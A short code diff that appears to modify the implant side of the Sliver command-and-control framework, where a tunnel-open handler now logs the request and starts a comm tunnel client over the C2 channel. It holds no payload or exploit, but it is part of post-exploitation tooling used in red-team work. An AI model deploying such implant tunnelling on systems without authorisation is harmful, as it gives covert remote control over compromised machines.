@@ -234,8 +234,15 @@ func commTunnelHandler(envelope *sliverpb.Envelope, connection *transports.Conne
 	data := &sliverpb.CommTunnelOpenReq{}
 	proto.Unmarshal(envelope.Data, data)
 
+	// {{if .Config.Debug}}
+	log.Printf("[tunnel] Received Comm Tunnel request (ID %d)", data.TunnelID)
+	// {{end}}
+
+	tunnel := comm.NewTunnel(data.TunnelID, transports.Transports.Server.C2.Send)
+	go comm.NewComm().InitClient(tunnel, true, transports.GetImplantPrivateKey())
+
 	// We pass it don to the Transport: blocks until the Transport takes it, on purpose.
-	transports.Transports.CommID <- data.TunnelID
+	// transports.Transports.CommID <- data.TunnelID
 
 	muxResp, _ := proto.Marshal(&sliverpb.CommTunnelOpen{
 		Success:  true,
